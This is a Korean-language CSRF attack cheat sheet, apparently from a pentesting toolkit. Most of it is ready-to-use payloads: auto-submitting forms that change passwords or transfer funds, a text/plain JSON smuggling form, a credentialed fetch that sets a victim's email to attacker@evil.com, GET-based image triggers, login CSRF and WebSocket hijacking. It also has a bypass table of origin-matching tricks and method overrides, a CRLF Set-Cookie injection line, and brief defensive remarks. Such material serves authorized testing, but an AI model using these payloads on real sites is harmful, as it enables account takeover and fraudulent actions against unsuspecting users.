### 정찰 페이로드

#### SameSite 쿠키 속성 확인
```
curl -v "https://target/auth/login" 2>&1 | grep -i 'set-cookie'
```

| SameSite | CSRF 가능성 |
|---|---|
| `None; Secure` | 가능 (cross-site 자동 첨부) |
| 미설정 (브라우저 기본 Lax) | GET 상태변경만 |
| `Lax` | GET 상태변경만 |
| `Strict` | 불가 |

#### CORS 정책 확인 (preflight 비교)
```
curl -sI -H "Origin: https://evil.com" "https://target/api/<endpoint>" | grep -iE '^access-control-'
curl -sI -X OPTIONS -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: authorization,content-type" \
  "https://target/api/<endpoint>" | grep -iE '^access-control-'
```

#### Sec-Fetch 헤더 응답 확인 (모던 브라우저 검증 활용 여부)
```
curl -v "https://target/api/<endpoint>" -H "Sec-Fetch-Site: cross-site" 2>&1 | grep -i "^< HTTP"
# 거부되면 Sec-Fetch-Site 검증 활용
```

---

### 기본 페이로드

#### HTML form (auto-submit, simple request)
```html
<form action="https://target/api/change-password" method="POST" id=f>
  <input name="new_password" value="hacked123">
</form>
<script>document.getElementById('f').submit()</script>
```

#### HTML form (multipart/form-data — preflight 미발생)
```html
<form action="https://target/api/upload" method="POST" enctype="multipart/form-data" id=f>
  <input name="file" type="file">
</form>
<script>document.getElementById('f').submit()</script>
```

#### HTML form (text/plain — preflight 미발생, JSON 파서 통과 시)
```html
<form action="https://target/api/transfer" method="POST" enctype="text/plain" id=f>
  <input name='{"to":"attacker","amount":1000,"x":' value='"y"}'>
</form>
<script>document.getElementById('f').submit()</script>
```

#### AJAX (CORS credentials)
```javascript
fetch('https://target/api/change-email', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'})
});
// CORS preflight 응답에 Access-Control-Allow-Credentials: true + Origin 반사면 가능
```

#### GET 상태변경 (SameSite=Lax 통과)
```html
<img src="https://target/api/transfer?to=attacker&amount=1000">
<a href="https://target/api/delete?id=victim">click</a>
```

#### Login CSRF (공격자 계정으로 강제 로그인)
```html
<form action="https://target/login" method="POST" id=f>
  <input name="username" value="attacker_account">
  <input name="password" value="attacker_pw">
</form>
<script>document.getElementById('f').submit()</script>
```

#### CSWSH (WebSocket Hijacking)
```javascript
const ws = new WebSocket('wss://target/ws');
ws.onopen = () => ws.send(JSON.stringify({action:'admin_delete', userId:'victim'}));
// 외부 origin에서 실행 시 브라우저가 victim 쿠키 자동 첨부
```

---

### 우회 페이로드

| 방어 | 페이로드 |
|---|---|
| 토큰 검증만 (Origin/Referer 미검증) | 토큰 추출 후 외부 페이지에서 자동 제출 — 토큰을 응답에서 sniff |
| Naive double submit (cookie==body 일치만) | 임의 동일 값 cookie+body — cookie 주입 가능(다른 sub-domain XSS, CRLF) 시 |
| Origin substring/prefix match | `https://example.com.attacker.com`, `https://example.com@attacker.com`, `https://example.com#attacker.com`, `https://attacker.com?Origin=https://example.com` |
| Referer 단독 검증 | `<meta name="referrer" content="no-referrer">`, `<a rel="noreferrer">`, HTTPS→HTTP downgrade |
| `SameSite=Lax` + GET 상태변경 | `<a>` 클릭, `<img src>`, `<iframe>` top-level navigation |
| 토큰 일부 method만 검증 (POST만) | PUT/DELETE/PATCH/HEAD/OPTIONS 시도, `X-HTTP-Method-Override: PUT` + POST, `_method=DELETE` form |
| `Content-Type: application/json` 강제 (preflight 트리거) | `text/plain` 또는 `application/x-www-form-urlencoded` simple request로 변형 (서버가 JSON 파싱하면 통과) |
| CORS Origin 화이트리스트 | substring match → `evil-allowed.com` 등록, `null` Origin 허용 (`<iframe sandbox>`) |
| 토큰 만료/rotation 없음 | 한번 캡처한 토큰 영구 재사용 |
| 토큰 GET URL 포함 | 외부 링크 클릭 시 Referer로 노출 → 재사용 |
| Sec-Fetch-Site 검증 | `<meta http-equiv="referrer" content="no-referrer">`로 Sec-Fetch metadata 일부 변형 (브라우저 의존) |

#### Cookie 주입 게이트 (다른 취약점 결합)
```
# CRLF로 Set-Cookie 주입
GET /redirect?url=evil%0d%0aSet-Cookie:csrf_token=ATTACKER_VAL HTTP/1.1
# Set-Cookie 응답 받은 후 naive double submit 우회 시도
```

---

### 참고사항

- 빈출 타깃: 비밀번호 변경, 이메일 변경, 결제, 관리자 권한 변경, 게시글 작성/삭제
- GraphQL mutation을 GET으로 허용하면 CSRF 직결 (graphql-scanner와 결합)
- API gateway가 쿠키를 백엔드로 통과시키는 경로는 백엔드 자체 CSRF 방어 누락 빈도 높음
- 모바일 앱 API는 Bearer 가정이 많아 쿠키 인증 잔존 시 CSRF 노출
- `Sec-Fetch-Site: cross-site` 헤더는 모던 브라우저 자동 첨부 — 서버 활용하면 강력한 방어
- WebSocket handshake에 SameSite 미적용되는 구 브라우저 환경 (CSWSH) 별도 점검
- 멀티 계정 테스트 필수 — 계정 A 토큰 캡처 후 계정 B 세션으로 재사용 시도
- Login CSRF는 공격자 계정으로 피해자 강제 로그인 → 피해자가 무심코 데이터 입력 → 공격자 계정에 저장 → 공격자가 자기 계정 들어가 데이터 탈취
- multipart/form-data + text/plain은 preflight 미발생 — JSON API라도 파서가 관대하면 우회
- CSRF 토큰을 LocalStorage 저장 + 헤더 전송은 XSS 결합 시 무력화 — HttpOnly 쿠키 + 서버 검증 권장
- DPoP/Sec-Fetch-* 같은 modern 방어가 가장 강력 (브라우저 강제)
- gateway 단에서 토큰 검증하는 경우 backend 직접 호출 우회 가능 — internal endpoint 점검
